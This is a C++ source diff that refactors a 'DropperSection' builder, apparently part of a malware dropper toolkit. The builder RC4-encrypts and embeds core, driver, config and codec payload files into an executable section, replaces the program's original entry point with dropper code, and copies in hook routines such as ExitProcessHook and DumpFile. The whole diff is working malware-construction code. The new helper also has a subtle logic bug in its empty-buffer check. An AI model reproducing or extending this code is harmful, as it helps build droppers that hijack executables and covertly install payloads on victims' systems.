@@ -33,7 +33,7 @@ DropperSection::~DropperSection(void)
 {
 }
 
-DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint)
+DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint )
 {
 	DWORD dataBufferSize = 0;
 	
@@ -121,84 +121,20 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint)
 	header->callAddresses.size = totalCalls * sizeof(DWORD);
 	ptr += header->callAddresses.size;
 	
-	// add core file
-	if (_files.core.buffer != NULL && _files.core.size > 0) {
-		header->files.names.core.offset = ptr - _data;
-		header->files.names.core.size = _files.core.name.size() + 1;
-		
-		memcpy(ptr, _files.core.name.c_str(), header->files.names.core.size);
-		ptr += header->files.names.core.size;
-		
-		header->files.core.offset = ptr - _data;
-		header->files.core.size = _files.core.size;
-		
-		// crypt and write file
-		rc4crypt((unsigned char*)header->rc4key, RC4KEYLEN, (unsigned char*)_files.core.buffer, _files.core.size);
-		memcpy(ptr, _files.core.buffer, _files.core.size);
-		
-		ptr += _files.core.size;
-	}
+	// embed core, driver, config and codec files
+	ptr = _embedFile(header->rc4key, _files.core, header->files.names.core, header->files.core, ptr);
+	ptr = _embedFile(header->rc4key, _files.driver, header->files.names.driver, header->files.driver, ptr);
+	ptr = _embedFile(header->rc4key, _files.config, header->files.names.config, header->files.config, ptr);
+	ptr = _embedFile(header->rc4key, _files.codec, header->files.names.codec, header->files.codec, ptr);
 	
-	// add driver file
-	if (_files.driver.buffer != NULL && _files.driver.size > 0) {
-		header->files.names.driver.offset = ptr - _data;
-		header->files.names.driver.size = _files.driver.name.size() + 1;
-
-		memcpy(ptr, _files.driver.name.c_str(), header->files.names.driver.size);
-		ptr += header->files.names.driver.size;
-
-		header->files.driver.offset = ptr - _data;
-		header->files.driver.size = _files.driver.size;
-
-		rc4crypt((unsigned char*)header->rc4key, RC4KEYLEN, (unsigned char*)_files.driver.buffer, _files.driver.size);
-		memcpy(ptr, _files.driver.buffer, _files.driver.size);
-
-		ptr += _files.driver.size;
-	}
-	
-	// add config file
-	if (_files.config.buffer != NULL && _files.config.size > 0) {
-		header->files.names.config.offset = ptr - _data;
-		header->files.names.config.size = _files.config.name.size() + 1;
-		
-		memcpy(ptr, _files.config.name.c_str(), header->files.names.config.size);
-		ptr += header->files.names.config.size;
-		
-		header->files.config.offset = ptr - _data;
-		header->files.config.size = _files.config.size;
-		
-		rc4crypt((unsigned char*)header->rc4key, RC4KEYLEN, (unsigned char*)_files.config.buffer, _files.config.size);
-		memcpy(ptr, _files.config.buffer, _files.config.size);
-		
-		ptr += _files.config.size;
-	}
-	
-	// add codec file
-	if (_files.codec.buffer != NULL && _files.codec.size > 0) {
-		header->files.names.codec.offset = ptr - _data;
-		header->files.names.codec.size = _files.codec.name.size() + 1;
-		
-		memcpy(ptr, _files.codec.name.c_str(), header->files.names.codec.size);
-		ptr += header->files.names.codec.size;
-		
-		header->files.codec.offset = ptr - _data;
-		header->files.codec.size = _files.codec.size;
-		
-		rc4crypt((unsigned char*)header->rc4key, RC4KEYLEN, (unsigned char*)_files.codec.buffer, _files.codec.size);
-		memcpy(ptr, _files.codec.buffer, _files.codec.size);
-		
-		ptr += _files.codec.size;
-	}
-	
-	// original OEP code
+	// save original OEP code
 	memcpy(ptr, _originalOEPCode, _originalOEPCodeSize);
 	header->originalOEPCode.offset = ptr - _data;
 	header->originalOEPCode.size = _originalOEPCodeSize;
 	ptr += _originalOEPCodeSize;
 	
-	// Total data section size
+	// compute total data section size and store in buffer
 	dataBufferSize = ptr - _data;
-	
 	memcpy(ptr, &dataBufferSize, sizeof(dataBufferSize));
 	ptr += sizeof(dataBufferSize);
 	
@@ -206,9 +142,8 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint)
 	memcpy(ptr, "<E>\0", 4);
 	ptr += 4;
 	
+	// find new EP and copy dropper code in it
 	DWORD newEP = ptr - _data;
-	
-	// Dropper code
 	DWORD newEPSize = (DWORD)NewEntryPoint_End - (DWORD)NewEntryPoint; 
 	memcpy(ptr, (PBYTE) NewEntryPoint, newEPSize);
 	ptr += newEPSize;
@@ -216,22 +151,12 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint)
 	cout << "NewEntryPoint is " << newEPSize << " bytes long, offset " << newEP << endl;
 	
 	// CoreThreadProc code
-	DWORD threadProcSize = (DWORD)CoreThreadProc_End - (DWORD)CoreThreadProc;
-	memcpy(ptr, (PBYTE) CoreThreadProc, threadProcSize);
-	header->functions.coreThread.offset = ptr - _data;
-	header->functions.coreThread.size = threadProcSize;
-	ptr += threadProcSize;
-	
-	cout << "CoreThreadProc is " << threadProcSize << " bytes long, offset " << header->functions.coreThread.offset << endl;
+	ptr += _embedFunction(CoreThreadProc, CoreThreadProc_End, header->functions.coreThread, ptr);
+	cout << "CoreThreadProc is " << header->functions.coreThread.size << " bytes long, offset " << header->functions.coreThread.offset << endl;
 	
 	// DumpFile code
-	DWORD dumpFileSize = (DWORD) DumpFile_End - (DWORD) DumpFile;
-	memcpy(ptr, (PBYTE) DumpFile, dumpFileSize);
-	header->functions.dumpFile.offset = ptr - _data;
-	header->functions.dumpFile.size = dumpFileSize;
-	ptr += dumpFileSize;
-	
-	cout << "DumpFile is " << dumpFileSize << " bytes long, offset " << header->functions.dumpFile.offset << endl;
+	ptr += _embedFunction(DumpFile, DumpFile_End, header->functions.dumpFile, ptr);
+	cout << "DumpFile is " << header->functions.dumpFile.size << " bytes long, offset " << header->functions.dumpFile.offset << endl;
 	
 	// ExitProcessHook data
 	// DWORD offsetToExitProcessHookData = ptr - _data;
@@ -241,39 +166,19 @@ DWORD DropperSection::build( WINSTARTFUNC OriginalEntryPoint)
 	
 	// END marker
 	memcpy(ptr, "<E>\0", 4);
-	ptr += 4;
-	
+	ptr += 4;	
+
 	// ExitProcessHook code
-	DWORD exitProcessHookSize = (DWORD)ExitProcessHook_End - (DWORD)ExitProcessHook;
-	
-	memcpy(ptr, (PBYTE) ExitProcessHook, exitProcessHookSize);
-	header->functions.exitProcessHook.offset = ptr - _data;
-	header->functions.exitProcessHook.size = exitProcessHookSize;
-	ptr += exitProcessHookSize;
-	
-	cout << "ExitProcessHook is " << exitProcessHookSize << " bytes long, offset " << (DWORD)header->functions.exitProcessHook.offset << endl;
+	ptr += _embedFunction(ExitProcessHook, ExitProcessHook_End, header->functions.exitProcessHook, ptr);
+	cout << "ExitProcessHook is " << header->functions.exitProcessHook.size << " bytes long, offset " << header->functions.exitProcessHook.offset << endl;
 
 	// ExitHook code
-	DWORD exitHookSize = (DWORD)ExitHook_End - (DWORD)ExitHook;
+	ptr += _embedFunction(ExitHook, ExitHook_End, header->functions.exitHook, ptr);
+	cout << "ExitHook is " << header->functions.exitHook.size << " bytes long, offset " << header->functions.exitHook.offset << endl;
 	
-	memcpy(ptr, (PBYTE) ExitHook, exitHookSize);
-	header->functions.exitHook.offset = ptr - _data;
-	header->functions.exitHook.size = exitHookSize;
-	ptr += exitHookSize;
-	
-	cout << "ExitHook is " << exitHookSize << " bytes long, offset " << (DWORD)header->functions.exitHook.offset << endl;
-	
-	//
-	// RC4
-	//
-	
-	DWORD rc4Size = (DWORD) rc4_skip_End - (DWORD) rc4_skip;
-	memcpy(ptr, rc4_skip, rc4Size);
-	header->functions.rc4.offset = ptr - _data;
-	header->functions.rc4.size = rc4Size;
-	ptr += rc4Size;
-	
-	cout << "RC4 is " << rc4Size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
+	// RC4 code
+	ptr += _embedFunction(rc4_skip, rc4_skip_End, header->functions.rc4, ptr);
+	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
 	
 	// compute total size
 	size_t virtualSize = ptr - _data;
@@ -315,6 +220,61 @@ bool DropperSection::addCodecFile( std::string path, std::string name )
 	cout << "Adding codec file \"" << path << "\" as \"" << name << "\"." << endl;
 	_files.codec.name = name;
 	return _readFile(path, _files.codec);
+}
+
+int DropperSection::_embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionBlob& func, char *ptr )
+{
+	DWORD size = (DWORD)funcEnd - (DWORD)funcStart;
+	memcpy(ptr, (PBYTE) funcStart, size);
+	func.offset = ptr - _data;
+	func.size = size;
+
+	return size;
+}
+
+char* DropperSection::_embedFile(char* rc4key, NamedFileBuffer& source, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr )
+{
+	// check if we have some data to be appended
+	if (source.buffer == NULL && source.size <= 0)
+		return 0;
+	
+	// copy name of file
+	name.offset = ptr - _data;
+	name.size = source.name.size() + 1;
+	memcpy(ptr, source.name.c_str(), name.size);
+	ptr += name.size;
+	
+#if 0
+	// encrypt data
+	int insize = source.size;
+	
+	char* packed = new char[aP_max_packed_size(insize)];
+	if (packed == NULL)
+		return 0;
+	char* workmem = new char[aP_workmem_size(insize)];
+	if (packed == NULL)
+		return 0;
+	
+	int packed_size = aPsafe_pack(source.buffer, packed, insize, workmem, NULL, NULL);
+	if (workmem)
+		delete [] workmem;
+#endif
+
+	char* packed = source.buffer;
+	int packed_size = source.size;
+
+	file.offset = ptr - _data;
+	file.size = packed_size;
+
+	// crypt and write file
+	rc4crypt((unsigned char*)rc4key, RC4KEYLEN, (unsigned char*)packed, packed_size);
+	memcpy(ptr, packed, packed_size);
+	ptr += packed_size;
+	
+	// XXX uncomment
+	// delete [] packed;
+	
+	return ptr;
 }
 
 bool DropperSection::_readFile( std::string path, NamedFileBuffer& buffer )
